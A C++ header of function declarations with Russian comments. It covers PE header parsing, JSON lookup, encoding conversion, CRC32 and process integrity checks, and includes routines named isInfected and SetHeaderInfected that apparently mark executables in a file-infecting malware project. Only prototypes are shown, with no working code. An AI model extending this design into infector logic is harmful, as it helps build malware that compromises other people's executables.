#pragma once

#include "global.hpp"
#include <Shlwapi.h>
extern "C"
{
#include "jfes\jfes.h"
}

DWORD dwGetFileArchitecture(PIMAGE_DOS_HEADER pFileBase);
VOID _RtlCopyMemory(LPBYTE target, LPBYTE from, SIZE_T dwSize);
BOOL _RtlCompareMemory(LPBYTE lpFirst, LPBYTE lpSecond, SIZE_T dwSize);

DWORD GetPEHeadersSize(HANDLE hFile, DWORD dwArch);
DWORD align(DWORD n, DWORD a);

DWORD Rva2Offset(BOOL b64, DWORD dwRva, UINT_PTR uiBaseAddress);
int _cdecl _rand(long *holdrand);

BOOL isInfected(PIMAGE_DOS_HEADER pFileBase, DWORD dwFileArch);
VOID SetHeaderInfected(PIMAGE_DOS_HEADER pFileBase, DWORD dwFileArch);
// перемешает случайно массив int
void shuffle(long *holdrand, LPINT lpArray, SIZE_T dwElements);

BOOL is_machine_firstexec();

// ищет keyword_name в джсоне и проверяет равен ли он value_json
// если такого кейворда нет или он равен другому значению, то возвращает фолс
BOOL isKeywordEqualTo(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, unsigned char *value_json, jfes_size_t start_index);
// находит и keyword и создает в памяти буфер с его содержимым, если такого кейворда нет, то возвращает NULL
PCHAR getStringFromKeyword(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, jfes_size_t start_index);
BOOL isKeywordExist(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, jfes_size_t start_index);

BOOL isKeywordEqualTo(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, unsigned char *value_json, jfes_size_t start_index, jfes_size_t *out_location_index);
PCHAR getStringFromKeyword(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, jfes_size_t start_index, jfes_size_t *out_location_index);
BOOL isKeywordExist(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, jfes_size_t start_index, jfes_size_t *out_location_index);
VOID AddSlash(PWCHAR pwFilePath);

LPBYTE Base64toBinary(PCHAR pchBase64, PSIZE_T dwOutSize);
PCHAR Convert2UTF8(PWCHAR pwStr, SIZE_T dwLen);
BOOL Convert2UTF16LE(PCHAR pchFrom, PWCHAR pwchTo, DWORD dwBufferSize);

void crc32_calculator(const void* data, size_t n_bytes, PDWORD crc);

DWORD dwCurrentProcessIntegrityLevel();

namespace WriteLogcmd
{
#ifdef _DEBUG_CMD
	// возвращает nullptr если такого параметра не существует
	// возвращает указатель на нововыделенную память с операндом параметра
	PWCHAR GetStrParamOperand(PWCHAR pwCommandLine, PWCHAR pwParameter);
	// возвращает TRUE если такой параметр был передан
	BOOL isParamExists(PWCHAR pwCommandLine, PWCHAR pwParameter);
	BOOL GetIntParamOperand(PWCHAR pwCommandLine, PWCHAR pwParameter, INT *iOutput);
#endif
}